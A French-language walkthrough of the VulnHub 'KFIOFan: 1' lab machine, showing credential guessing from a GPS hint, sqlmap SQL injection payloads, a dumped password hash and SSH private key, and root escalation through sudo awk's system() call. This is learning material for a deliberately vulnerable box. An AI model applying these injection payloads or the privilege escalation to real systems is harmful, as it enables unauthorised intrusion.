---
title: "Solution du CTF KFIOFan: 1 de VulnHub"
tags: [CTF, VulnHub]
---

[KFIOFan: 1](https://vulnhub.com/entry/ctf-kfiofan-1,260/) est un CTF créé par un Youtuber français nommé [Khaos Farbauti Ibn Oblivion](https://www.youtube.com/@KhaosFarbautiIbnOblivion/featured).

Un scan de port nous remonte un service SSH et un Apache. Ce dernier requiert une authentification quelle que soit la requête (ou la méthode HTTP).

```console
$ curl -D- http://192.168.56.170/
HTTP/1.1 401 Unauthorized
Date: Mon, 10 Apr 2023 20:08:46 GMT
Server: Apache
WWW-Authenticate: Basic realm="47.833333 -0.7"
Content-Length: 65
Content-Type: text/html; charset=iso-8859-1

Laisse moi deviner Bob, tu as encore perdu ton mot de passe ? LOL
```

On remarque l'entête `WWW-Authenticate` qui semble donner des coordonnées GPS. Je les passe donc sur *Google Maps* qui m'indique :

```
5 Rue de la Courtille, 53200 Château-Gontier-sur-Mayenne
```

Après quelques essais l'authentification passe avec l'utilisateur `Bob` et le mot de passe `Château-Gontier`.

On tombe alors sur un *Dotclear*, CMS d'origine française que j'ai déjà utilisé par le passé.

Je remarque surtout une section de recherche qui semble custom. Même si aucune erreur SQL n'apparait lors de la saisie d'apostrophes et guillemets, c'est suffisant pour mériter de lancer `SQLmap`.

```bash
python sqlmap.py -u 'http://192.168.56.170/khaosearch.php' -H 'Authorization: Basic Qm9iOkNow6J0ZWF1LUdvbnRpZXI=' --data 'recherche=ee' --risk 3 --level 5
```

L'intuition était bonne :

```
sqlmap identified the following injection point(s) with a total of 248 HTTP(s) requests:
---
Parameter: recherche (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: recherche=-4122" OR 5409=5409-- oNWk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: recherche=ee" AND (SELECT 3162 FROM (SELECT(SLEEP(5)))kFkJ)-- gyqB

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: recherche=ee" UNION ALL SELECT NULL,CONCAT(0x71706b6b71,0x526e646f714b4d6e7a7344625153704b41584e4f7a7565526a6166625a764a454a6f6c766e7a664d,0x71766a7671)-- -
---
[09:13:57] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

Dans la base de données `blog` on retrouve la table des utilisateurs ainsi qu'une mystérieuse table `ssh_keys`.

```
Database: blog
[19 tables]
+----------------+
| dc_blog        |
| dc_category    |
| dc_comment     |
| dc_link        |
| dc_log         |
| dc_media       |
| dc_meta        |
| dc_permissions |
| dc_ping        |
| dc_post        |
| dc_post_media  |
| dc_pref        |
| dc_session     |
| dc_setting     |
| dc_spamrule    |
| dc_user        |
| dc_version     |
| ssh_keys       |
| videos         |
+----------------+
```

Je récupère tout de même le hash d'_Alice_ : `$2y$10$4cqdn5uEkdFXICtcTvnZyOPdmwU8Uk.Wu6TJGEDwywzn7NrQFgAae`.

Mais ce que je trouve dans `ssh_keys` sera suffisant pour la suite :

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAs7nk559NSGWagGw3bDk25hc6nFuZLX0C66SSpNabiUXS3AL0
CXjH9APOukQlERFyZA4jQM4IC2jQcv5QqyjNe/Gd8M3WPPruygtZYlQ2SviEghuR
PECggL4OF/9ohAsPc3R7SXliMZtshOK+qFgs3pEnfZhw9B10qynKezdUiCB9rQ3R
8Ewbz7KCNIf/RnOYLygIHyR2mHCZnQXJvJq+jWosFDPQELeUNvb0UEyyneERkMEr
xsdi0T192DRYvHknkXOIdjC5Ba+RviDp9fRHGY3sw9dv6l8sYT8hYaTSzDeiTWm2
QtN5vNxHJXTMyX/PC+wA6NL9NZau1N/YxSHJcQIDAQABAoIBAF7R5IKO+ScI88pt
TZA7X0tlVfbIHLhzC+dmnDd7QfPacrTAmh+lKVkD6T08VpH6sm83RkIacQQT+GWy
5rxmeoK5pqo07qKdgP33nuDRrRNAqig6gxVWw1co7iabCXkgnLY87g6Fi9jANzCk
sBIA8ys5SaxpkK46HCNxmPII7wAhwcoE0/F/hQBrhWxZrBCMaEhCXtjdrLs1rEN+
TSLl/5A3h71DMVGwkW/LEvmt9wSE+urw+gd33ZxKD23Qvp6xF7ccMvrxIla40ZGH
RCDZTux4zOlMNePJB2D25LRsrnOExu9A1IQu7SajWy/vvPa3rjeY9k+j4PyU6C5V
3iRq7wECgYEA2wvf7wzeIlQdCNOzlUrdcTRHv5B9cViJUUz6kaq8R0UMkqpS4/k7
NNKGiAzk7C2tHkV9LK7QC0r35ERtJY8dj75PTR4ZNf9+eVtYQ9ZkycZFwYJGjEB+
AtXE5wMqObkuDiComm/1psrYF98n2d8O39Xvm88NqQTbY6B6NXMk1n0CgYEA0gvd
s5MV6GynUaJ3Hutpqbq1WNJwfFu5gAqLv1iv5DkmVhc6fcQSzGBRmhLUC7idJniM
k/CfSSjdntmNTC1cI1BydirtPYvaytWCef6lhoXPB5VAk7NdWRfepKpnYrKz2igx
+gZBFjEJBzWigKtEAAm+7YHTLzntmwZyk5teTQUCgYBiGBZHsoaD7xE1k8DXebhj
ats6sZVLvi94hjWsKD661/RCdh4607Es/Z6brNKT5fyiEtJ0wTCP7hnHUtFiQY4m
gj53NaRqpylXZY3Ii2mFZtJ0T0gSpQsJb/wGzEcLpJ84Wm3HA56J/Er7ncb17ct2
eBMevoHKkE9DdWllKFR17QKBgQC/UCeCZDnUFQLhDAVLmEgJXBHI8QObgUAYK4LV
qcWrLZKJX2bbHjexBxnMJ9ITSvd4Dtyb8tJiJGKXSLe15qrBT4ixsK+dG0EQ9h99
Vj8Vo9LJqVvEK96eQ2t6t+qqrvG5hlrey8uElu0OL//vCg9JqZbJZTIhFbYhOWIq
p5zgsQKBgGuZfQp3g+5KdL4yVCAUp5Pe7iBrd7EdU1zs6MLBFEXh6PpNWY+bQFAo
H33/4/uD3eao+c84qoZ8GTPgxF2nje4c9tf3u/6cWfjekyR7O+FZ0biINikaL3Qf
xE80Uy2XgPZj6q4DPZ/qeQLgYscC1OC/8KQXl6L3JoramGw0lQuq
-----END RSA PRIVATE KEY-----
```

On obtient notre premier accès au système :

```console
$ ssh -i alice.key alice@192.168.56.170
Linux kfiofan 4.9.0-7-amd64 #1 SMP Debian 4.9.110-1 (2018-07-05) x86_64



          .__....._             _.....__,
            .": o :':         ;': o :".
            `. `-' .'.       .'. `-' .'
              `---'             `---'

    _...----...      ...   ...      ...----..._
 .-'__..-""'----    `.  `"`  .'    ----'""-..__`-.
'.-'   _.--"""'       `-._.-'       '"""--._   `-.`
'  .-"'                  :                  `"-.  `
  '   `.              _.'"'._              .'   `
        `.       ,.-'"       "'-.,       .'
          `.                           .'
            `-._                   _.-'
                `"'--...___...--'"`

TIC TAC TIC TAC TIC TAC TIC TAC TIC TAC TIC TAC TIC

Last login: Thu Aug  2 23:53:20 2018 from 192.168.1.28
alice@kfiofan:~$ id
uid=1000(alice) gid=1000(alice) groupes=1000(alice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
alice@kfiofan:~$ ls -a
.  ..  .bash_logout  .bashrc  flag3.txt  .profile  .ssh
alice@kfiofan:~$ cat flag3.txt
FLAG 3 : Bravo pour être arrivé jusqu'ici. Cela montre que tu maitrises très bien les notions essentielles ! Un dernier petit effort et le root est à toi !
```

Le `TIC TAC` dans le message d'accueil n'est pas engageant, on va tâcher de faire vite :)

L'utilisatrice peut exécuter AWK en tant que root :

```console
alice@kfiofan:~$ sudo -l
Entrées par défaut pour alice sur kfiofan :
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

L'utilisateur alice peut utiliser les commandes suivantes sur kfiofan :
    (root) NOPASSWD: /usr/bin/awk
```

AWK est un utilitaire, mais aussi un langage de programmation. On peut rechercher dans la manpage comment exécuter un programme.

Déjà, il y a une option pour spécifier un code AWK :

>       -f program-file  
>       --file program-file  
>              Read the AWK program source from the file program-file, instead of from the first command line argument.  Multiple -f (or --file) options may be used.

Et dans la partie concernant le langage, je trouve une fonction au nom explicite.

>       system(cmd-line)      Execute the command cmd-line, and return the exit status.  (This may not be available on non-POSIX systems.)  See the manual for the full details on the exit stat

C'est parti :

```console
alice@kfiofan:~$ echo 'system("chmod 4755 /bin/dash")' > setuid.awk
alice@kfiofan:~$ echo | sudo /usr/bin/awk -f setuid.awk 
alice@kfiofan:~$ ls -al /bin/dash
-rwsr-xr-x 1 root root 117208 janv. 24  2017 /bin/dash
alice@kfiofan:~$ /bin/dash
# id
uid=1000(alice) gid=1000(alice) euid=0(root) groupes=1000(alice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
# cd /root
# ls
flag4.txt  genere_ssh_key.sh  genere_web_pass.sh  timer_reboot.sh  ville.txt
# cat flag4.txt
FLAG 4 : TERMINE ! Un grand bravo à toi pour être arrivé jusqu'ici : la machine est à toi, sa survie ou sa destruction repose désormais entièrement sur ton éthique. Bonne continuation Hacker
```

Et effectivement après la récupération du flag ma connexion s'est coupée et la clé SSH n'était plus acceptée (sans doute recréée à chaque fois).
